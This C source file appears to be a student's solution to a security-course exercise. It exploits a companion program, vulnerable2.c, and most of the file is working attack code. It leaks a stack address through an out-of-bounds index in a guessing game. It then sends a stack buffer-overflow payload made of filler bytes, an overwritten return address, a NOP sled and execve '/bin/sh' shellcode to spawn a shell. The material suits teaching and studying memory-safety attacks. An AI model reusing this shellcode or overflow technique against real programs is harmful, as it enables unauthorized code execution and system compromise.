/* exploit_2.c  */

/* Interacts with vulnerable2.c for code injection. */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <inttypes.h>

#define BUFF_SZ 512
#define disable_buffering(_fd) setvbuf(_fd, NULL, _IONBF, 0)

char shellcode[]=
  "\x31\xc0"             /* xorl    %eax,%eax         */
  "\x50"                 /* pushl   %eax              */
  "\x68""//sh"           /* pushl   $0x68732f2f       */
  "\x68""/bin"           /* pushl   $0x6e69622f       */
  "\x89\xe3"             /* movl    %esp,%ebx         */
  "\x50"                 /* pushl   %eax              */
  "\x53"                 /* pushl   %ebx              */
  "\x89\xe1"             /* movl    %esp,%ecx         */
  "\x99"                 /* cdq                       */
  "\xb0\x3b"             /* movb    $0x3b,%al         */
  "\x2c\x30"             /* sub     $0x30,%al         */
  "\xcd\x80"             /* int     $0x80             */
;

/* This is a function to make a guess given a slot and
 * guess value. You are free to modify, delete, and use
 * this as you see fit -- it is here if you want it, and
 * there is NO requirement that you must it.
 */
unsigned int make_guess(int idx, unsigned int guess)
{
    char buff[BUFF_SZ] = {0};
    unsigned int value = guess;

    /* Read the index prompt, send index */
    scanf("%s", buff); printf("%d\n", idx);

    /* Read the guess prompt, send guess */
    memset(buff, 0, BUFF_SZ);
    scanf("%s", buff); printf("%d\n", guess);

    /* Read the result, set value to actual result if wrong */
    memset(buff, 0, BUFF_SZ); fgets(buff, BUFF_SZ, stdin);
    if (strstr(buff, "Wrong") != NULL)
        sscanf(buff, " Wrong! The value was: %u\n", &value);

    return value;
}

// +2147483647 -2147483648 int
// +4294967295             uint

int main()
{
    /* This makes the pipe communication easier; you can ignore it*/
    disable_buffering(stdout);

    /* TODO: Interact with the vulnerable program and build your payload here
     *       Keep in mind that you may use make_guess if you wish
     */

    make_guess(0,10);
    make_guess(0,10);
    make_guess(0,10);
    make_guess(0,10);
    make_guess(0,10);
    make_guess(0,10);
    make_guess(0,10);
    make_guess(0,10);
    make_guess(0,10);
    unsigned int value = make_guess(4294967290,19); //4294967296 is index 0 of secret_buff
    // 4294967290

    // fgets will take 1298 characters
    // name only holds 512
    // higher indexes of array are pushed onto stack first

    char buffer[769] = {0};
    int i;
    for (i = 0; i < 769 - strlen(shellcode); i++) {
      buffer[i] = '\x90';
    }
    for (i = 0; i < strlen(shellcode); i++) {
      buffer[i + 769 - strlen(shellcode)] = shellcode[i];
    }

    unsigned char arr[5] = {0};
    unsigned int add = value;
    arr[0] = (add >> 24) & 0xFF;
    arr[1] = (add >> 16) & 0xFF;
    arr[2] = (add >> 8) & 0xFF;
    arr[3] = (add) & 0xFF;

    // eip lives after 524 chars
    // 524 char string + address + nops + shellcode
    printf("%s%c%c%c%c%s", "AAAAAGGGGaaaaaaaStlTzsUJPNvMLOsokSAPlvLppoXuGrMPNQRHghrRUeCXcvvHJeKvfNpCrqNeLYkREqFCMBWJObFUVmjVokhQFxVWonCCCStNVDxpdmHPjzwsbKJenKwYyJDjSOTObgzjDwzfmhrbnPRRMAkBlhAZKpSRIllKTdwXWOYPDpiCTTqREKuZkpKGrmDVzmySnYCemLwWgzsxUBtvfajHIOrlXEOQbXPlOmVjsCigZNUbitGhEAeRSavznFScHPHYXjlcKOLkOTljDjMXOfWZdEkfwfijQMWJiJbeDFysOylxWYkJcCQrvJxJxxRDAYNRxeffDQxfAgbbUhuWcswVSCKHsjVTZRypzfyeQiAuucYKKnQynZUGnWOLzEkulowakDlIccTnUpHnbfTvlRgzIqugVYdavCGquYhwzqqnFKwFjxRaxGVJLatEamCdrXxVBCNajBNuMWfAYlwXPlYhKeoARlAIENgOAoIVEuXFSMFrfqLfjhJYJETtfEYFkxTk", 
          arr[3], arr[2], arr[1], arr[0], buffer);

    char buff[BUFF_SZ] = {0};
    fgets(buff, BUFF_SZ, stdin);

    return 0;
}
